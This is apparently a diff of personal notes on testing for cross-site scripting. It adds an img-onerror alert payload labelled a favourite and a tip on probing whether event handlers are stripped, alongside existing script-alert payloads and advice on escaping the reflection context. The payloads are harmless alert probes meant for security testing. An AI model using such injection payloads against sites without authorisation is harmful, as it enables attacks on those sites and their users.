@@ -1,4 +1,12 @@
 
+Garrs favorite:
+`"><img src=a onerror=alert(34)>`
+![[Images/Pasted image 20240723202901.png]]
+![[Images/Pasted image 20240723202943.png]]
+How does it handle different characters. Is it stripping event handlers but keeping the img tag? Then you could try a simple script-alert-script payload.
+
+---
+
 `<script>alert("Succ3ssful XSS")</script>`
 check where the text is reflected, in a tag?, in a string? end those:
 `"><script>alert("Succ3ssful XSS")</script>`
